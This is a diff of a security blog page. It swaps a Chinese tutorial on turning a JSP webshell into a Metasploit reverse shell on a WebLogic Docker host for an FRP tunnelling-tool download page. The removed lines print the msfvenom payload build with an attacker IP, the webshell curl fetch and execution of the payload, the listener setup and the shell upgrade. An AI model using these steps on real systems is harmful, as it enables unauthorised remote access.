@@ -23,11 +23,11 @@
 
 <!-- Open Graph metadata -->
 <meta property="og:type" content="website" />
-<meta property="og:title" content="「渗透」:一句话反弹docker-shell | © 哨兵" />
+<meta property="og:title" content="Frp Based On Golang | © 哨兵" />
 <meta property="og:description" content="本站由哨兵安全实验室支持创办" />
 <meta property="og:image" content="https://bin4xin.github.io/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
-<meta property="og:url" content="https://bin4xin.github.io/blog/2020/docker-reverse-shell-by-one/" />
-<title> 「渗透」:一句话反弹docker-shell | © 哨兵 | SENTINEL SECURITY, LAB</title>
+<meta property="og:url" content="https://bin4xin.github.io/blog/2021/FRP-Based-On-Golang/" />
+<title> FRP Based On Golang | © 哨兵 | SENTINEL SECURITY, LAB</title>
 <link rel="stylesheet" href="/assets/css/cate-document.css">
 <link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
 <link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
@@ -104,7 +104,7 @@
         <!-- SINGLE POST -->
         <div class="markdown-body-img flex-column">
             <!-- Blog Post  -->
-            <h1 class="ctitle">「渗透」:一句话反弹docker-shell</h1>
+            <h1 class="ctitle">Frp Based On Golang</h1>
             <div class="post-meta-row">
                 <!--article author end-->
 
@@ -131,7 +131,12 @@
 
     <span class="ymh-time-badge">
         
-            Jan 30, 52289
+            
+                
+                    16h
+                
+                edited
+            
         
     </span>
 </span>
@@ -154,7 +159,6 @@
 
 
     
-    
 
 
 
@@ -162,146 +166,374 @@
 
 
 
-<section class="gh-banner warn" aria-labelledby="banner-title-上次动笔在-strong-6-年前-strong-放了一阵了" role="region" data-dismissible="true">
+<section class="gh-banner success" aria-labelledby="banner-title-写于-strong-今天-strong-墨迹未干" role="region" data-dismissible="true">
     <div class="banner-icon" aria-hidden="true">
         
         <svg viewBox="0 0 16 16" fill="currentColor">
-            <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575L6.457 1.047ZM8 4.75a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4.75Zm.75 6.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+            <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
         </svg>
         
     </div>
 
     <div class="banner-content">
-        <span class="banner-text">上次动笔在 <strong>6 年前</strong>，放了一阵了</span>
+        <span class="banner-text">写于 <strong>今天</strong>，墨迹未干</span>
     </div>
 </section>
 
-                <blockquote>
-  <p>一句话木马反弹shell</p>
+                <h1 id="frp-based-on-golang">FRP Based On Golang</h1>
 
-  <p>前提：现在情况是已经上传了一句话木马，可以执行命令如：ls,pwd,whoami等；</p>
+<section class="gh-banner info" aria-labelledby="banner-title-frp-是一个专注于内网穿透的高性能的反向代理应用-支持-tcp-udp-http-https等多种协议-可以将内网服务以安全-便捷的方式通过具有公网-ip-节点的中转暴露到公网" role="region" data-dismissible="true">
+    <div class="banner-icon" aria-hidden="true">
+        
+        <svg viewBox="0 0 16 16" fill="currentColor">
+            <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path>
+        </svg>
+        
+    </div>
 
-  <p>问题在于，不管用<code class="language-plaintext highlighter-rouge">python</code>、<code class="language-plaintext highlighter-rouge">bash</code>还是<code class="language-plaintext highlighter-rouge">perl</code>都反弹不了（如下），偷不了懒，就上msf把。</p>
-</blockquote>
+    <div class="banner-content">
+        <span class="banner-text">frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</span>
+    </div>
+</section>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=pwd
-/u01/oracle/user_projects/domains/base_domain
-http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=whoami
-oracle
-</code></pre></div></div>
+<h2 id="frp-介绍">FRP 介绍</h2>
+<p>通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p>
 
-<h4 id="msf生成shell文件">msf生成shell文件</h4>
-<p><code class="language-plaintext highlighter-rouge">msfvenom</code>先生成反弹shell文件，赋权。</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@iZj6cgn7odv59wmjjhe6zwZ:~## msfvenom <span class="nt">-p</span> linux/x64/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>47.52.233.92 <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> elf <span class="o">&gt;</span> shell.elf
-<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 1046632 bytes
-Final size of elf file: 1046632 bytes
-root@iZj6cgn7odv59wmjjhe6zwZ:~## <span class="nb">chmod </span>777 shell.elf
-</code></pre></div></div>
+<ul>
+  <li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li>
+  <li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</li>
+  <li>代理组间的负载均衡。</li>
+  <li>端口复用，多个服务通过同一个服务端端口暴露。</li>
+  <li>多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</li>
+  <li>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</li>
+  <li>服务端和客户端 UI 页面。</li>
+</ul>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=ls</span>
-<span class="c">#测试一下一句话木马，是可以执行命令的：</span>
-total 1100
-drwxr-x--- 15 oracle oracle    4096 Apr 27 08:06 <span class="nb">.</span>
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 ..
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 autodeploy
-drwxr-x---  6 oracle oracle    4096 Apr 25 00:23 bin
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 common
-drwxr-x---  9 oracle oracle    4096 Apr 25 00:24 config
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 console-ext
-<span class="nt">-rw-r-----</span>  1 oracle oracle     234 Apr 25 00:23 derby.log
-<span class="nt">-rw-r-----</span>  1 oracle oracle     257 Apr 25 00:24 edit.lok
-<span class="nt">-rw-r-----</span>  1 oracle oracle     327 Jul 19  2017 fileRealm.properties
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 init-info
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 lib
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 nodemanager
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 orchestration
-drwxr-x---  2 oracle oracle    4096 Apr 26 01:39 original
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 security
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 servers
-<span class="nt">-rwxr-x---</span>  1 oracle oracle     261 Apr 25 00:23 startWebLogic.sh
-drwxr-x---  3 oracle oracle    4096 Apr 25 09:49 tmp
-</code></pre></div></div>
+<h2 id="下载链接">下载链接</h2>
 
-<h4 id="下载shell文件执行">下载shell文件执行</h4>
-<p>在一句话木马上执行下载命令，<code class="language-plaintext highlighter-rouge">Wget</code>和<code class="language-plaintext highlighter-rouge">Curl</code>都可以，一般linux机器上都自带下载工具</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=curl -o shell.elf http://ip/shell.elf</span>
-<span class="c">#等待下载完毕；继续赋权</span>
-<span class="nb">chmod </span>777 shell.elf
-<span class="c">#在查看一下：</span>
-total 1100
-drwxr-x--- 15 oracle oracle    4096 Apr 27 08:06 <span class="nb">.</span>
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 ..
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 autodeploy
-drwxr-x---  6 oracle oracle    4096 Apr 25 00:23 bin
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 common
-drwxr-x---  9 oracle oracle    4096 Apr 25 00:24 config
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 console-ext
-<span class="nt">-rw-r-----</span>  1 oracle oracle     234 Apr 25 00:23 derby.log
-<span class="nt">-rw-r-----</span>  1 oracle oracle     257 Apr 25 00:24 edit.lok
-<span class="nt">-rw-r-----</span>  1 oracle oracle     327 Jul 19  2017 fileRealm.properties
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 init-info
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 lib
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 nodemanager
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 orchestration
-drwxr-x---  2 oracle oracle    4096 Apr 26 01:39 original
-drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 security
-drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 servers
-<span class="nt">-rwxrwxrwx</span>  1 oracle oracle 1046632 Apr 27 08:06 shell.elf
-<span class="nt">-rwxr-x---</span>  1 oracle oracle     261 Apr 25 00:23 startWebLogic.sh
-drwxr-x---  3 oracle oracle    4096 Apr 25 09:49 tmp
-</code></pre></div></div>
+<div class="dl-panel" id="frp-dl">
+  <div class="dl-panel-head">
+    <h3 class="dl-panel-title">
+      FRP v0.39.1
+      
+        <span class="dl-panel-version">v0.39.1</span>
+      
+    </h3>
+    
+      <p class="dl-panel-note"><i class="fas fa-info-circle"></i> 根据实际服务器架构选择对应版本</p>
+    
+  </div>
 
-<h4 id="shell流量接入">shell流量接入</h4>
-<p>我们发现已经成功下载了反弹shell的msf文件，直接执行
-<code class="language-plaintext highlighter-rouge">http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=./shell.elf</code>，执行前别忘了在服务器上监听端口。</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfconsole</span>
-msf5 <span class="o">&gt;</span> use exploit/multi/handler
-msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PAYLOAD linux/x64/meterpreter_reverse_tcp
-PAYLOAD <span class="o">=&gt;</span> linux/x64/meterpreter_reverse_tcp
-msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 0.0.0.0
-LHOST <span class="o">=&gt;</span> 0.0.0.0
-msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 1234
-LPORT <span class="o">=&gt;</span> 1234
-msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+  
+  <div class="dl-os-bar">
+    <b class="dl-tab-btn active" data-dl-target="frp-dl-win" data-dl-group="frp-dl-os">
+      <i class="fab fa-windows"></i> Windows
+    </b>
+    <b class="dl-tab-btn" data-dl-target="frp-dl-linux" data-dl-group="frp-dl-os">
+      <i class="fab fa-linux"></i> Linux
+    </b>
+    <b class="dl-tab-btn" data-dl-target="frp-dl-mac" data-dl-group="frp-dl-os">
+      <i class="fab fa-apple"></i> macOS
+    </b>
+  </div>
 
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 0.0.0.0:1234
+  
+  <div class="dl-mirror-bar" data-dl-group="frp-dl-mirror">
+    <span class="dl-mirror-label"><i class="fas fa-server"></i> 镜像源</span>
+    
+      <b class="dl-mirror-btn active" data-dl-mirror="github" data-dl-group="frp-dl-mirror">
+        GitHub Release
+      </b>
+    
+      <b class="dl-mirror-btn " data-dl-mirror="ghproxy" data-dl-group="frp-dl-mirror">
+        ghproxy 加速
+      </b>
+    
+  </div>
 
-</code></pre></div></div>
-<p>执行完就可以看到建立连接的流量接入了：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>172.31.116.237:1234 -&gt; 59.110.152.168:44832<span class="o">)</span> at 2020-04-27 16:08:48 +0800
-<span class="c">#下一步：</span>
-meterpreter <span class="o">&gt;</span> shell
-Process 460 created.
-Channel 1 created.
-<span class="nb">whoami
-</span>oracle
-<span class="c">#获得一个交互式shell</span>
-python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/sh")'</span>
-sh-4.2<span class="nv">$ </span><span class="nb">whoami
-whoami
-</span>oracle
-sh-4.2<span class="nv">$ </span><span class="nb">sudo </span>su
-<span class="nb">sudo </span>su
-sh: <span class="nb">sudo</span>: <span class="nb">command </span>not found
-python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
-<span class="o">[</span>oracle@5c6fe690ac22 base_domain]<span class="nv">$ </span><span class="nb">pwd
-pwd</span>
-/u01/oracle/user_projects/domains/base_domain
-<span class="o">[</span>oracle@5c6fe690ac22 base_domain]<span class="nv">$ </span><span class="nb">ls
-ls
-</span>autodeploy  console-ext           init-info      original   startWebLogic.sh
-bin         derby.log             lib            security   tmp
-common      edit.lok              nodemanager    servers
-config      fileRealm.properties  orchestration  shell.elf
-<span class="o">[</span>oracle@5c6fe690ac22 base_domain]<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
-<span class="nb">uname</span> <span class="nt">-a</span>
-Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4 23:02:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
-</code></pre></div></div>
+  
+  <div class="dl-content" id="frp-dl-win" data-dl-group="frp-dl-os" style="display:block;">
+    
+      <div class="dl-mirror-section is-visible" data-dl-mirror-content="github" data-dl-group="frp-dl-mirror">
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x86</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_windows_386.zip</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">&gt; </span>curl -LO https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_windows_386.zip</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_windows_amd64.zip</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">&gt; </span>curl -LO https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_windows_amd64.zip</code></pre>
+        </div>
+        
+      </div>
+    
+      <div class="dl-mirror-section is-hidden" data-dl-mirror-content="ghproxy" data-dl-group="frp-dl-mirror">
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x86</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_windows_386.zip</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">&gt; </span>curl -LO https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_windows_386.zip</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_windows_amd64.zip</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">&gt; </span>curl -LO https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_windows_amd64.zip</code></pre>
+        </div>
+        
+      </div>
+    
+  </div>
 
-<p>以上。</p>
+  
+  <div class="dl-content" id="frp-dl-linux" data-dl-group="frp-dl-os" style="display:none;">
+    
+      <div class="dl-mirror-section is-visible" data-dl-mirror-content="github" data-dl-group="frp-dl-mirror">
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x86</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_386.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_386.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_amd64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_amd64.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">arm</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_arm.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_arm.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">arm64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_arm64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_arm64.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">mips</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_mips.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_mips.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">mips64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_mips64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_mips64.tar.gz</code></pre>
+        </div>
+        
+      </div>
+    
+      <div class="dl-mirror-section is-hidden" data-dl-mirror-content="ghproxy" data-dl-group="frp-dl-mirror">
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x86</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_386.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_386.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_amd64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_amd64.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">arm</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_arm.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_arm.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">arm64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_linux_arm64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>wget https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_linux_arm64.tar.gz</code></pre>
+        </div>
+        
+      </div>
+    
+  </div>
+
+  
+  <div class="dl-content" id="frp-dl-mac" data-dl-group="frp-dl-os" style="display:none;">
+    
+      <div class="dl-mirror-section is-visible" data-dl-mirror-content="github" data-dl-group="frp-dl-mirror">
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_darwin_amd64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>curl -LO https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_darwin_amd64.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">arm64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_darwin_arm64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>curl -LO https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_darwin_arm64.tar.gz</code></pre>
+        </div>
+        
+      </div>
+    
+      <div class="dl-mirror-section is-hidden" data-dl-mirror-content="ghproxy" data-dl-group="frp-dl-mirror">
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">x64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_darwin_amd64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>curl -LO https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_darwin_amd64.tar.gz</code></pre>
+        </div>
+        
+        <div class="dl-item">
+          <div class="dl-item-label">
+            <span class="dl-arch-tag">arm64</span>
+            <span class="dl-size-tag">3</span>
+            <span class="dl-filename">frp_0.39.1_darwin_arm64.tar.gz</span>
+          </div>
+          <pre class="dl-code"><code><span class="token prompt">$ </span>curl -LO https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v0.39.1/frp_0.39.1_darwin_arm64.tar.gz</code></pre>
+        </div>
+        
+      </div>
+    
+  </div>
+
+  
+  
+  <div class="dl-verify">
+    <div class="dl-verify-title"><i class="fas fa-shield-halved"></i> 校验文件完整性</div>
+    
+      <pre class="dl-code"><code><span class="token prompt">$ </span>sha256sum frp_0.39.1_linux_amd64.tar.gz</code></pre>
+    
+      <pre class="dl-code"><code><span class="token prompt">$ </span>sha256sum frp_0.39.1_linux_arm64.tar.gz</code></pre>
+    
+      <pre class="dl-code"><code><span class="token prompt">$ </span>sha256sum frp_0.39.1_darwin_amd64.tar.gz</code></pre>
+    
+      <pre class="dl-code"><code><span class="token prompt">$ </span>sha256sum frp_0.39.1_darwin_arm64.tar.gz</code></pre>
+    
+      <pre class="dl-code"><code><span class="token prompt">&gt; </span>certutil -hashfile frp_0.39.1_windows_amd64.zip SHA256</code></pre>
+    
+      <pre class="dl-code"><code><span class="token prompt">&gt; </span>certutil -hashfile frp_0.39.1_windows_386.zip SHA256</code></pre>
+    
+  </div>
+  
+</div>
+
+<script>
+(function(){
+  // OS tab switching
+  document.querySelectorAll('.dl-tab-btn[data-dl-target]').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var group = this.getAttribute('data-dl-group');
+      var target = this.getAttribute('data-dl-target');
+      // Deactivate siblings
+      document.querySelectorAll('.dl-tab-btn[data-dl-group="' + group + '"]').forEach(function(b){
+        b.classList.remove('active');
+      });
+      this.classList.add('active');
+      // Show/hide content panels
+      document.querySelectorAll('.dl-content[data-dl-group="' + group + '"]').forEach(function(c){
+        c.style.display = 'none';
+      });
+      var el = document.getElementById(target);
+      if(el) el.style.display = 'block';
+    });
+  });
+
+  // Mirror switching
+  document.querySelectorAll('.dl-mirror-btn').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var group = this.getAttribute('data-dl-group');
+      var mirror = this.getAttribute('data-dl-mirror');
+      // Deactivate siblings
+      document.querySelectorAll('.dl-mirror-btn[data-dl-group="' + group + '"]').forEach(function(b){
+        b.classList.remove('active');
+      });
+      this.classList.add('active');
+      // Show/hide mirror sections (across all OS panels)
+      var contentGroup = group.replace('-mirror', '-os');
+      document.querySelectorAll('.dl-mirror-section[data-dl-group="' + group + '"]').forEach(function(s){
+        s.classList.toggle('is-visible', s.getAttribute('data-dl-mirror-content') === mirror);
+        s.classList.toggle('is-hidden', s.getAttribute('data-dl-mirror-content') !== mirror);
+      });
+    });
+  });
+})();
+</script>
+
+<h2 id="q--a">Q &amp; A</h2>
+
+<ul>
+  <li><a href="https://github.com/fatedier/frp/issues/2391">怎么远程关闭FRPC端？ #2391</a></li>
+</ul>
+
+<section class="gh-banner success" aria-labelledby="banner-title-可以通过将-frpc-的-admin-界面通过-frps-代理出来-然后通过这个代理的界面来操作-frpc-这样这个需求就变成-frpc-的管理界面提供一个关闭自身的方法" role="region" data-dismissible="true">
+    <div class="banner-icon" aria-hidden="true">
+        
+        <svg viewBox="0 0 16 16" fill="currentColor">
+            <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+        </svg>
+        
+    </div>
+
+    <div class="banner-content">
+        <span class="banner-text">可以通过将 frpc 的 admin 界面通过 frps 代理出来，然后通过这个代理的界面来操作 frpc。这样这个需求就变成 frpc 的管理界面提供一个关闭自身的方法</span>
+    </div>
+</section>
 
             <!-- [x] 2022/10/20/10:49:36 fixed: while width < some inch. would be flex column not display like a row.-->
 <footer>
@@ -336,7 +568,7 @@ Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4
 				<h2 class="lead">申明</h2>
 				<div>
 					<div class="mb-2">
-						<a href="/blog/2020/docker-reverse-shell-by-one/" target="_blank" class="text-bold">
+						<a href="/blog/2021/FRP-Based-On-Golang/" target="_blank" class="text-bold">
 							<div class="fa fa-link"></div>
 							转载请申明本文档链接
 						</a>
@@ -354,7 +586,7 @@ Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4
 		<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
 			<h2 class="lead">贡献开源文档</h2>
 			<div>
-				<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-04-27-docker-reverse-shell-by-one.markdown" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2021-11-23-FRP-Based-On-Golang.md" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
 					<svg aria-hidden="true" focusable="false" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg>
 					贡献当前开源文档
 				</a>
@@ -373,7 +605,7 @@ Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4
 					<div class="fa fa-thumbs-o-up"></div>
 				</span>
 			</a>
-			<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2020-04-27-docker-reverse-shell-by-one.markdown&nbsp; 「渗透」:一句话反弹docker-shell | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
+			<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2021-11-23-FRP-Based-On-Golang.md&nbsp;FRP Based On Golang | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
 				<span class="btn mr-1 color-border-accent-emphasis" title="本文档有问题?">
 					<div class="fa fa-thumbs-o-down"></div>
 				</span>
